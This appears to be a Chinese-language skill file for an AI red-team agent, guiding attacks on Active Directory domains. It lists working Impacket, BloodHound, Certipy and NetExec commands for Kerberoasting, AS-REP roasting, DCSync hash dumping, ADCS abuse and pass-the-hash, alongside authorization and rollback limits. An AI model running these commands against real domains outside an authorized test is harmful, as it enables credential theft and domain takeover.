---
name: ad-attack
description: 【内网】AD/域环境攻击：域用户/主机枚举、Kerberoast/AS-REP、ACL 与 ADCS、DCSync、PtH/票据、域控路径（Impacket / BloodHound / Certipy / NetExec）
whenToUse: 内网发现域环境、域账号、域控或 ADCS，需要从普通域用户走到域管/域控，或判断当前权限还能打哪里时
role: internal
category: 内网
tags: [ad, kerberos, bloodhound, adcs]
enabled: true
---

# AD / 域环境攻击

> 只做授权范围内的域。域控、ADCS、ACL 都是高价值目标：**能只读取证就不写**；必须改 ACL/模板/组时先备份原值、记录回滚方法。

## 前置与工具

| 工具 | 路径/安装 | 用途 |
| --- | --- | --- |
| Impacket 套件 | `/usr/bin/impacket-*`（Kali 自带 61 个命令） | 枚举、Kerberos、DCSync、PtH |
| ldapsearch / enum4linux-ng | 系统包 | LDAP / SMB 枚举 |
| BloodHound + SharpHound / bloodhound-python | 官方 Release / pip，校验和 | ACL 与最短域控路径 |
| Certipy | pipx / 官方 Release | ADCS 模板与证书攻击 |
| NetExec（nxc） | pipx | SMB/LDAP/WinRM 批量验证 |
| Rubeus（Windows 侧） | 官方 Release | 票据申请/导入 |

工具未安装时先用 `command -v` 确认；缺工具就写 `needs`，不要手搓 Kerberos/SMB 协议。

## 枚举（先只读）

```bash
# 域用户 / 主机 / 组
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<pass>' -b 'DC=<domain>,DC=<tld>' '(objectClass=user)' sAMAccountName memberOf

# BloodHound 采集（先 All，数据量大时再按需）
bloodhound-python -u <user> -p '<pass>' -d <domain> -dc <DC_IP> -c All
```

- 先看 `redteam_credential_list` / `redteam_access_list` 里已有的域账号、哈希、票据；
- 关注：域管组、ACL 写权限、Unconstrained/Constrained Delegation、ADCS 模板、可写 OU、LAPS 可读、SMB 签名关闭的主机。

## 常见路径

1. **Kerberoast / AS-REP**（离线破解，目标侧流量小）：
   ```bash
   impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request
   impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat
   ```
2. **ADCS**：`certipy find -u <user>@<domain> -p '<pass>' -dc-ip <DC_IP> -vulnerable`；只对确认可用的模板做最小请求，证书/模板变更要记录。
3. **ACL 路径**：BloodHound 查 `GenericAll/WriteDACL/ForceChangePassword/AddMember`；改权限前记录原 ACL。
4. **DCSync**：只有拿到复制权限/域管时才用 `impacket-secretsdump -just-dc`；不要把整域哈希无差别导出。
5. **PtH / 票据**：`impacket-wmiexec -hashes :<NThash>`、`getTGT`/`getST`；优先 WMI/atexec，少用 psexec（服务落地、噪声大）。
6. **NTLM Relay / mitm6**：只在授权且目标未强制 SMB 签名时评估；属于高噪声动作，先写假设和停止条件。

## 证据与记分

- 凭据/哈希/票据：`redteam_credential_add`（`secret_type` 写 ntlm/kerberos，`source` 写 Kerberoast/AS-REP/DCSync/ACL）；
- 登录/会话：`redteam_access_add`（method=smb/winrm/ldap）；
- 得分：域控/堡垒机/SSO/终端管理 → `central-system`；域名/DNS 控制 → `domain-control`；普通主机 → `server-host`；命令写进 `redteam_score_hit` 的 `command`/`result`。
- 高价值结果（域控、ADCS）必须换命令/重新登录复核。

## OPSEC 与边界

- 先查域账号锁定策略；在线尝试严格限流，同一账号失败 5 次停；
- 不在域控上跑交互式工具；DCSync/ secretsdump 只在必要时做，导出量最小化；
- 不新建域管、不批量改密、不删 ACL；必须写操作时先备份并记录回滚；
- 目标日志不清理；清理只针对自己上传的文件/会话（`redteam_cleanup`）。

## 交接

回报：域结构、拿到什么权限（域管/本地管理员/普通域用户）、可用票据/哈希、到域控的最短路径、未打通的卡点；`needs` 写清缺的工具/凭据/授权。
